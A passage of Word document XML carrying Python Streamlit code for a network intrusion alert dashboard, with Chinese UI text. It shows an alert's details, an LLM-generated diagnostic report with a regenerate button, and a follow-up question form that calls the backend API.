      </w:r>
    </w:p>
    <w:p w14:paraId="5BAB11DE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    report = data.get("report")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11B36D61">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    head = st.columns([3, 1, 1])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F488283">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    with head[0]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EF6B22D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        st.subheader(f"#{alert_id} {alert['category']}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39BD9F33">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    with head[1]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="540B2320">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if alert.get("source") == "rule":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E7C6A32">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            st.caption(f"规则命中（超出阈值 {float(alert['confidence']):.2f} 倍）")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B606AA0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0622A0A8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            st.caption(f"置信度 {float(alert['confidence']):.1%}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="294079E1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    with head[2]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CED819F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        st.markdown(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EA7D273">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"&lt;span style='color:{RISK_COLORS.get(alert['risk'], INK_MUTED)}'&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08918CFD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"● {RISK_TEXT.get(alert['risk'], alert['risk'])}&lt;/span&gt;",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DF1AFF2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            unsafe_allow_html=True,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48F3BAA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3942DF2F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    st.caption(f"探针 {alert['probe_id']}　流标识 `{alert['flow_key']}`")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="174C95C4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="34D1C596">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if report:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57CA1A49">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        st.markdown(report["content"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E5A1B69">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        st.caption(f"报告 #{report['id']}　模型 {report['model']}　耗时 {report['elapsed_ms']} ms")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F12A220">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BA4E6F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        st.info("这份告警还没有报告。")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="448FD5B8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    col_a, col_b = st.columns([1, 1])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C4DF1E0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if col_a.button("重新生成报告", key="regen"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EA41FE7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        res, err = api_post("/api/v1/diagnose", {"alert_id": alert_id, "force": True})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ABB6873">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if err:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="688AEB72">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            st.error(err)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A4891F3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79286153">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if report:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EE55ECE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                st.session_state.pop(f"chat_answer_{report['id']}", None)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="166817E5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            st.success("已提交，几秒后自动刷新")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F83B638">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    with col_b:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E4E5634">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        st.caption("大模型不可用时，报告会退化为模板版并明确标注。")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68CBFC5B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36421A08">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if report:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C82ED49">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        st.divider()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="532600FA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        st.subheader("追问")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A1268B2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        with st.form(key=f"chat_{report['id']}", clear_on_submit=True):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DE0758B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            q = st.text_area("继续提问", placeholder="例如：如果是内网主机被攻陷发起的，处置顺序有什么不同？")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41A99332">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            ok = st.form_submit_button("发送")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C2B4CB5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if ok and q.strip():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="424ADAA6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            res, err = api_post("/api/v1/chat", {"report_id": report["id"], "question": q})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FB03D3D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if err:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66D73EEE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                st.error(err)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ED077B2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4645645F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                # 存在 session_state 里：这个标签页每 10 秒整块重渲，直接 st.success 会被刷掉</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D2B9CDD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                st.session_state[f"chat_answer_{report['id']}"] = res["answer"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="239FE2D6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                st.rerun(scope="fragment")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EACE3DE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        answer = st.session_state.get(f"chat_answer_{report['id']}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4406F31D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if answer:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74983FBA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            st.success(answer)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="452E6225">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7102681D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2332C67E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>with tab_report:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D5D7F08">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if live:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B53181B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        st.fragment(run_every=10.0)(draw_report)()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F260A9A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
